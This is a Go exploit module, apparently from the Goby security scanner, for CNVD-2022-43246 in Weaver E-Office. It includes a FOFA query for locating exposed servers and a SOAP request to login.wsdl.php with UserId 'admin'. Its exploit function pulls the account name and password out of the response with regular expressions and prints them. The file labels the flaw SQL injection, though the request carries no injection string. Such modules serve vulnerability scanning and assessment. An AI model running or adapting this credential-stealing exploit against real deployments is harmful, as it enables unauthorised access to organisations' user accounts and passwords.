package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office login.wsdl.php file SQL Injection Vulnerability",
    "Description": "<p>Weaver E-office is a standard collaborative mobile office platform under Weaver.</p><p>There is a SQL injection vulnerability in Weaver E-office, and attackers can use this vulnerability to obtain any user account information, password, mobile phone number, etc. in the system.</p>",
    "Impact": "<p>Weaver E-Office SQL Injection Vulnerability (CNVD-2022-43246)</p>",
    "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability. Please update it in time:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "Product": "E-office",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office login.wsdl.php 文件 SQL 注入漏洞",
            "Product": "E-office",
            "Description": "<p>泛微E-office是泛微旗下的一款标准协同移动办公平台。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">泛微E-office</span>存在SQL注入漏洞，攻击者可利用该漏洞获取系统内任意用户账号信息、密码、手机号等。<br></p>",
            "Recommendation": "<p>厂商已发布补丁修复漏洞，请及时更新：<span style=\"color: var(--primaryFont-color);\"><a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">泛微E-office</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">存在SQL注入漏洞，</span>攻击者可通过此漏洞获取系统内任意用户信息，例如账号、加密密码、手机号、名字等。密码解密后可浏览oa内部系统信息文件等。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office login.wsdl.php file SQL Injection Vulnerability",
            "Product": "E-office",
            "Description": "<p>Weaver E-office is a standard collaborative mobile office platform under Weaver.</p><p>There is a SQL injection vulnerability in Weaver E-office, and attackers can use this vulnerability to obtain any user account information, password, mobile phone number, etc. in the system.</p>",
            "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability. Please update it in time:<a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a><br></p>",
            "Impact": "<p>Weaver E-Office SQL Injection Vulnerability (CNVD-2022-43246)</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Author": "Lyaa0",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-03-27",
    "References": [
        "https://www.weaver.com.cn/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-43246"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/webservice-json/login/login.wsdl.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml;charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:LoginServicewsdl\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <urn:GetCurrentInformation soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n         <UserId xsi:type=\"xsd:string\"></UserId>\n      </urn:GetCurrentInformation>\n   </soapenv:Body>\n</soapenv:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "GetCurrentInformationResponse",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/webservice-json/login/login.wsdl.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml;charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:LoginServicewsdl\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <urn:GetCurrentInformation soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n         <UserId xsi:type=\"xsd:string\"></UserId>\n      </urn:GetCurrentInformation>\n   </soapenv:Body>\n</soapenv:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "GetCurrentInformationResponse",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10367"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/webservice-json/login/login.wsdl.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "text/xml;charset=UTF-8")
			cfg.Data = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:LoginServicewsdl\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <urn:GetCurrentInformation soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n         <UserId xsi:type=\"xsd:string\"></UserId>\n      </urn:GetCurrentInformation>\n   </soapenv:Body>\n</soapenv:Envelope>"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "GetCurrentInformationResponse")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/webservice-json/login/login.wsdl.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "text/xml;charset=UTF-8")
			cfg.Data = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:LoginServicewsdl\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <urn:GetCurrentInformation soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n         <UserId xsi:type=\"xsd:string\">admin</UserId>\n      </urn:GetCurrentInformation>\n   </soapenv:Body>\n</soapenv:Envelope>"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				Data := regexp.MustCompile(`.*USER_ACCOUNTS&quot;:&quot;(.*?)&quot;,`).FindStringSubmatch(resp.Utf8Html)[1]
				Data1 := regexp.MustCompile(`.*PASSWORD&quot;:&quot;(.*?)&quot;,`).FindStringSubmatch(resp.Utf8Html)[1]
				Data2 := strings.Replace(Data1, "\\", "", -1)
				expResult.Output += "UserName:" + Data + "\nPassWord:" + Data2
				expResult.Success = true
			}
			return expResult
		},
	))
}
